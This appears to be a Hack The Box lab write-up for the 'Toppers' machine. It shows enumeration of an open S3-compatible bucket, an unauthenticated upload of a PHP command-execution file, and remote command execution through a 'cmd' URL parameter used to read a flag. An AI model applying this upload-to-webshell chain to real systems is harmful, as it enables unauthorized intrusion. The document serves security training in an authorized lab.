# Hack The Box — The Toppers

**Difficulty:** Easy
**Platform:** Hack The Box
**Focus:** Web Enumeration, S3 Misconfiguration, File Upload, Remote Code Execution

---

## 1. Initial Enumeration

I started by performing an Nmap scan against the target to identify the open ports and running services.



The scan revealed an HTTP service running on port 80, indicating that a web application was available on the target.

![Nmap Scan](screenshots/nmap.png)

Since HTTP was exposed, I continued with web enumeration.

---

## 2. Web Enumeration

I accessed the web service and inspected the website to understand how the application was structured.

During the enumeration process, I discovered that the target was associated with the domain:

```text
thetoppers.htb
```

I added the hostname to my `/etc/hosts` file so that the domain could be resolved locally.

![Web Application](screenshots/subdomain.png)

After identifying the main domain, I continued looking for additional services and subdomains.

---

## 3. Discovering the S3 Service

During further enumeration, I discovered an S3-compatible service associated with:

```text
s3.thetoppers.htb
```

This was particularly interesting because S3 services can sometimes expose buckets or allow unauthorized access if they are incorrectly configured.

I therefore investigated the available buckets using the AWS CLI without authentication.


This confirmed the existence of an accessible S3 bucket.

![S3 Bucket Discovery](screenshots/subdomain.png)

---

## 4. Enumerating the Bucket

I then enumerated the contents of the discovered bucket.

```bash
aws s3 ls s3://thetoppers.htb/ \
  --endpoint-url http://s3.thetoppers.htb \
  --no-sign-request
```

The bucket contained several files belonging to the web application, including:

```text
.htaccess
index.php
```

as well as image files.

![Bucket Contents](screenshots/list_bucket.png)

I downloaded `index.php` to inspect its contents.

Although the file mainly contained the website's HTML and JavaScript, finding the web application's files inside the S3 bucket suggested that the bucket was closely related to the web root.

---



## 6. Achieving Remote Code Execution

To test whether uploaded PHP files were executed by the web server, I created a simple PHP command execution file and uploaded it to the S3 bucket:

```bash
aws s3 cp reverse.php s3://thetoppers.htb/ \
  --endpoint-url http://s3.thetoppers.htb \
  --no-sign-request
```

I then accessed the uploaded PHP file through the web application and supplied a command through the `cmd` parameter:

```text
http://thetoppers.htb/reverse.php?cmd=id
```

The server returned the result of the command, confirming that arbitrary commands could be executed remotely.

The attack chain at this point was:

```text
S3 Misconfiguration
        ↓
Unauthenticated File Upload
        ↓
Upload PHP File
        ↓
PHP Execution
        ↓
Remote Code Execution
```

---

## 7. Locating the Flag

With command execution established, I enumerated the `/var/www/` directory:

```bash
ls -la /var/www/
```

The output revealed:

```text
flag.txt
html/
```

The flag was therefore located at:

```text
/var/www/flag.txt
```

![Flag Location](screenshots/flag.png)

I then read the contents of the file:

```bash
cat /var/www/flag.txt
```

![Flag](screenshots/08-flag.png)

The flag was successfully retrieved.

---

## 8. Attack Chain Summary

The complete attack path was:

```text
Nmap Enumeration
       ↓
Web Service Discovery
       ↓
thetoppers.htb
       ↓
S3 Service Discovery
       ↓
Accessible S3 Bucket
       ↓
Unauthenticated Bucket Write Access
       ↓
Upload PHP File
       ↓
Remote Code Execution
       ↓
Enumerate /var/www/
       ↓
Read flag.txt
```

---

## 9. What I Learned

This machine helped me understand how a seemingly simple cloud-storage misconfiguration can lead to complete compromise of a web application.

The main concepts I practiced were:

* Nmap service enumeration
* Web enumeration
* Virtual host / hostname discovery
* S3 bucket enumeration
* AWS CLI usage
* Unauthenticated S3 access
* File upload vulnerabilities
* PHP command execution
* Remote Code Execution (RCE)
* Linux filesystem enumeration
* Understanding Linux file permissions
* Chaining multiple vulnerabilities and misconfigurations into a complete attack path

The most important lesson was that individual findings do not always look dangerous on their own. The accessible S3 bucket became much more significant once I discovered that it also allowed file uploads and that those uploaded files could be executed by the web server.

---

## Disclaimer

This write-up was created while solving an intentionally vulnerable Hack The Box machine in an authorized lab environment. The techniques demonstrated here should only be used against systems where I had permission to perform security testing.
